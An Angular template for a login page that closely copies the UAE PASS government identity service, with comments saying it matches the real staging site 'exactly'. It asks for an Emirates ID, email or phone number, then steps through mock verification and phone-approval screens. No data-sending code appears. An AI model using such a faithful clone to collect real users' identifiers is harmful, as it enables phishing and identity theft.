<div class="login-page">
    <!-- Top accent bar -->
    <div class="top-bar"></div>

    <main class="login-main">
        <!-- STEP 1: Login Form (matching real UAE PASS staging) -->
        <div class="login-wrapper" *ngIf="state() === 'idle'">
            <div class="login-card">
                <!-- Official UAE PASS fingerprint icon -->
                <div class="fingerprint-icon">
                    <img src="self_service.png" alt="UAE PASS" />
                </div>

                <h1 class="login-title">Login to UAE PASS</h1>

                <form (ngSubmit)="onSubmit()" class="login-form">
                    <div class="input-wrapper" [class.has-error]="errorMessage()">
                        <input type="text" id="emiratesId" [(ngModel)]="emiratesId" name="emiratesId"
                            placeholder="Emirates ID, email, or phone eg. 971500000000" autocomplete="off"
                            class="login-input" (focus)="showTooltip = true" (blur)="showTooltip = false" />
                    </div>

                    <div class="error-msg" *ngIf="errorMessage()">
                        <svg viewBox="0 0 20 20" fill="none" width="16" height="16">
                            <circle cx="10" cy="10" r="9" stroke="#dc3545" stroke-width="1.5" />
                            <path d="M10 6v5" stroke="#dc3545" stroke-width="1.5" stroke-linecap="round" />
                            <circle cx="10" cy="14" r="0.8" fill="#dc3545" />
                        </svg>
                        {{ errorMessage() }}
                    </div>

                    <div class="remember-row">
                        <label class="checkbox-label">
                            <input type="checkbox" checked />
                            Remember me
                        </label>
                    </div>

                    <button type="submit" class="btn-login">Login</button>
                </form>

                <div class="footer-links">
                    <p>Don't have UAEPASS account? <a href="https://stg.uaepass.ae/signup" target="_blank">Create new
                            account</a></p>
                    <a href="https://stg.uaepass.ae/account-recovery" target="_blank" class="recover-link">Recover your
                        account</a>
                </div>
            </div>

            <!-- Validation Tooltip (shown on focus) -->
            <div class="tooltip-box" *ngIf="showTooltip">
                <button class="tooltip-close" (click)="showTooltip = false">×</button>
                <div class="tooltip-section">
                    <h4>Mobile number</h4>
                    <p>Should consist of 10 to 12 digits</p>
                    <span class="tooltip-example">ex: 971520901234/ 0521237654</span>
                </div>
                <div class="tooltip-section">
                    <h4>Email</h4>
                    <p>Should contain "&#64;" with no spaces</p>
                    <span class="tooltip-example">ex: sam&#64;domain.com</span>
                </div>
                <div class="tooltip-section">
                    <h4>Emirates ID</h4>
                    <p>Should consist of 15 digits</p>
                    <span class="tooltip-example">ex: 784XXXXXXXXXXXX</span>
                </div>
            </div>
        </div>

        <!-- STEP 2: Verifying Identity -->
        <div class="login-card center-card" *ngIf="state() === 'verifying'">
            <div class="fingerprint-icon pulsing">
                <svg viewBox="0 0 80 94" xmlns="http://www.w3.org/2000/svg">
                    <g fill="none" stroke="#00B27A" stroke-width="1.6" stroke-linecap="round">
                        <path d="M40 10c-16.5 0-30 13.5-30 30" opacity="0.35" />
                        <path d="M40 10c16.5 0 30 13.5 30 30" opacity="0.35" />
                        <path d="M40 17c-12.7 0-23 10.3-23 23" opacity="0.45" />
                        <path d="M40 17c12.7 0 23 10.3 23 23" opacity="0.45" />
                        <path d="M40 24c-9 0-16 7-16 16s7 16 16 16" opacity="0.55" />
                        <path d="M40 24c9 0 16 7 16 16" opacity="0.55" />
                        <path d="M40 31c-5 0-9 4-9 9s4 9 9 9" opacity="0.7" />
                        <path d="M40 31c5 0 9 4 9 9" opacity="0.7" />
                        <path d="M40 37c-1.7 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3" opacity="0.85" />
                    </g>
                </svg>
            </div>
            <h1 class="login-title">Verifying your identity...</h1>
            <p class="state-text">Connecting to UAE PASS server</p>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>

        <!-- STEP 3: Approve on Phone -->
        <div class="login-card center-card" *ngIf="state() === 'approving'">
            <div class="phone-illustration">
                <svg viewBox="0 0 60 80" fill="none" xmlns="http://www.w3.org/2000/svg" width="56" height="75">
                    <rect x="5" y="2" width="50" height="76" rx="8" stroke="#ccc" stroke-width="2" fill="white" />
                    <rect x="10" y="10" width="40" height="52" rx="2" fill="#f8f9fa" />
                    <circle cx="30" cy="70" r="3" stroke="#ccc" stroke-width="1.5" fill="none" />
                    <rect x="22" y="5" width="16" height="2" rx="1" fill="#e0e0e0" />
                    <circle cx="30" cy="36" r="12" fill="#e8f5e9" stroke="#00B27A" stroke-width="1.5" />
                    <path d="M24 36l4 4 8-8" stroke="#00B27A" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round" />
                </svg>
            </div>

            <h1 class="login-title">Approve on your phone</h1>
            <p class="state-text">Open the UAE PASS app and enter this code:</p>

            <div class="verification-code">
                <span *ngFor="let digit of verificationCode().split('')" class="code-digit">{{ digit }}</span>
            </div>

            <div class="waiting-indicator">
                <div class="pulse-dot"></div>
                <span>Waiting for approval...</span>
            </div>
        </div>

        <!-- STEP 4: Success -->
        <div class="login-card center-card" *ngIf="state() === 'success'">
            <div class="success-icon">
                <svg viewBox="0 0 80 80" fill="none" width="72" height="72">
                    <circle cx="40" cy="40" r="36" fill="#e8f5e9" stroke="#00B27A" stroke-width="2" />
                    <path d="M24 40l10 10 22-22" stroke="#00B27A" stroke-width="3.5" stroke-linecap="round"
                        stroke-linejoin="round" />
                </svg>
            </div>
            <h1 class="login-title" style="color:#00B27A">Identity Verified!</h1>
            <p class="state-text">Redirecting to your dashboard...</p>
        </div>
    </main>

    <!-- Bottom section (matching real UAE PASS exactly) -->
    <footer class="page-footer">
        <div class="footer-accent-bar"></div>
        <div class="footer-nav">
            <a href="#">Home</a>
            <a href="#">About</a>
            <a href="#">Support</a>
            <a href="#">FAQ</a>
            <a href="#">Kiosk Locations</a>
            <a href="#">Service Provider</a>
        </div>
        <p class="copyright">Copyright © 2026 UAE PASS All rights reserved.</p>
    </footer>
</div>